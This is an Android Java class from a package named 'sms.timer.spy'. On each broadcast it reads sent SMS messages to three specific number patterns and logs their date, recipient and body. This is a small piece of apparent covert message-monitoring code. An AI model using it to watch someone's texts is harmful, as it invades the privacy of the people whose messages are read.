package com.example.sms.timer.spy;

import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class AlarmService extends BroadcastReceiver {

private static String[] projection=new String[] {
			"_id",
			"address",
			"date",
			"body"
	};

	
	@Override
	public void onReceive(Context context, Intent intent) {
		Cursor cur = context.getContentResolver().query(
	    		Uri.parse("content://sms/sent"), 
	    		projection,"address LIKE '%2496072%' OR address LIKE '%6452629%' OR address LIKE '%3702680%'", null,"_id ASC");
	    while (cur.moveToNext()) {
	    	Log.i(this.getClass().getName(), "From " + cur.getString(0) + " : "+ new Date( cur.getLong(2)).toString() + " : "+ cur.getString(1) + " : " + cur.getString(3));
	    }
	}

}
